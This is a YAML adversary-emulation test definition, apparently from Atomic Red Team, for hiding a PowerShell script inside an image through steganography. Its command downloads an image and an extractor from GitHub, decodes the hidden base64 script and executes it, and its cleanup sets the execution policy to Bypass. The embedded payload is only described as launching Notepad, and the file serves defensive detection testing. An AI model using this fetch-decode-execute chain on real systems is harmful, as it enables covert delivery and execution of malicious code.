- id: 04bb8e3d-1670-46ab-a3f1-5cee64da29b6
  name: Embedded Script in Image Execution via Extract-Invoke-PSImage
  description: "This atomic test demonstrates the technique of data obfuscation via\
    \ steganography, where a PowerShell script is concealed within an image file.\
    \ \nThe PowerShell script is embedded using steganography techniques, making it\
    \ undetectable by traditional security measures. The script is hidden \nwithin\
    \ the pixels of the image, enabling attackers to covertly transfer and execute\
    \ malicious code across systems.\n\nThe test begins by ensuring the availability\
    \ of the malicious image file and the Extract-Invoke-PSImage script. The test\
    \ proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image\
    \ file using the Extract-Invoke-PSImage tool. The extracted script is then decoded\
    \ from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1).\
    \ Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this\
    \ atomic test, the malicious image file which is downloaded has the powershell\
    \ command Start-Process notepad embedded within in base64. This\nis done to emulate\
    \ an attackers behaviour in the case they were to execute malware embedded within\
    \ the image file."
  tactic: command-and-control
  technique:
    attack_id: T1001.002
    name: Data Obfuscation via Steganography
  platforms:
    windows:
      psh:
        command: 'if (!(Test-Path "PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg"))
          {exit 1} else {; {exit 0}; }; then : ; else New-Item -Type Directory (split-path
          "PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg") -ErrorAction Ignore
          | Out-Null; Write-Output "Downloading image file..."; $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg";
          Invoke-WebRequest -Uri $imageUrl -OutFile PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg;
          fi; if (!(Test-Path "PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1"))
          {exit 1} else {; {exit 0}; }; then : ; else New-Item -Path "PathToAtomicsFolder\ExternalPayloads\"
          -ItemType Directory -Force | Out-Null; Write-Output "Downloading Extract-Invoke-PSImage.ps1
          script..."; $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1";
          Invoke-WebRequest -Uri $scriptUrl -OutFile PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1;
          fi; cd "PathToAtomicsFolder\ExternalPayloads\"; Import-Module .\Extract-Invoke-PSImage.ps1;
          $extractedScript=Extract-Invoke-PSImage -Image "PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg"
          -Out "$HOME\result.ps1"; $scriptContent = Get-Content "$HOME\result.ps1"
          -Raw; $base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])";
          $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object
          { $_.Value }; $base64Strings | Set-Content "$HOME\decoded.ps1"; $decodedContent
          = Get-Content "$HOME\decoded.ps1" -Raw; $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent));
          $textPattern = ''^.+''; $textMatches = [regex]::Matches($decodedText, $textPattern)
          | ForEach-Object { $_.Value }; $scriptPath = "$HOME\textExtraction.ps1";
          $textMatches -join '''' | Set-Content -Path $scriptPath; . "$HOME\textExtraction.ps1"'
        cleanup: Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore;
          Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore; Remove-Item
          -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore; Remove-Item
          -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - command-and-control
  - atomic-red-team
  - t1001.002
  author: Atomic Red Team
  additional_info:
    input_arguments:
      image_file:
        description: Malicious Image file which will be downloaded
        type: path
        default: PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg
      psimage_script:
        description: Extract-Invoke-PSImage Script downloaded
        type: path
        default: PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1
    dependencies:
    - description: 'Image file must exist

        '
      prereq_command: 'if (!(Test-Path "#{image_file}")) {exit 1} else {

        {exit 0}

        }

        '
      get_prereq_command: 'New-Item -Type Directory (split-path "#{image_file}") -ErrorAction
        Ignore | Out-Null

        Write-Output "Downloading image file..."

        $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"

        Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}

        '
    - description: 'Extract-Invoke-PSImage must exist

        '
      prereq_command: 'if (!(Test-Path "#{psimage_script}")) {exit 1} else {

        {exit 0}

        }

        '
      get_prereq_command: 'New-Item -Path "PathToAtomicsFolder\ExternalPayloads\"
        -ItemType Directory -Force | Out-Null

        Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."

        $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"

        Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}

        '
    technique_created: '2020-03-15T00:37:58.963Z'
    atomic_guid: 04bb8e3d-1670-46ab-a3f1-5cee64da29b6
    import_timestamp: '2025-08-05T03:47:15.259966Z'
